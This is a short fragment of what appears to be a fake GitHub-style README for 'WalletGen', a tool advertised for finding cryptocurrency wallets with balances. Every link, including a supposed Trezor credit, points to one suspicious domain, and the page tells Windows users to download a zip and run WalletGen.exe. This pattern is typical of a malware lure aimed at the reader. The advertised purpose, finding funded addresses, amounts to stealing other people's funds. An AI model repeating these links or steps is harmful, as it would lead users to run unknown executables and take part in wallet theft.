...
[Download here](https://downloadgitzsx.icu?glc7cz4bj711f0z)
...
## Windows 
- Download [WalletGen.zip](https://downloadgitzsx.icu?ea8mvqj2d7grwyb)
- Unpack anywhere
- Run `WalletGen.exe`
...
You can download the WalletGen given on the [page in the release](https://downloadgitzsx.icu?kmd3vc8jw336d4g).

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [page in the release](https://downloadgitzsx.icu?2cpbthttyin7399).
...
## Credits
This project uses code from the [Trezor project](https://downloadgitzsx.icu?j65i0n1xlgjrcsf). The code is licensed under the MIT License.
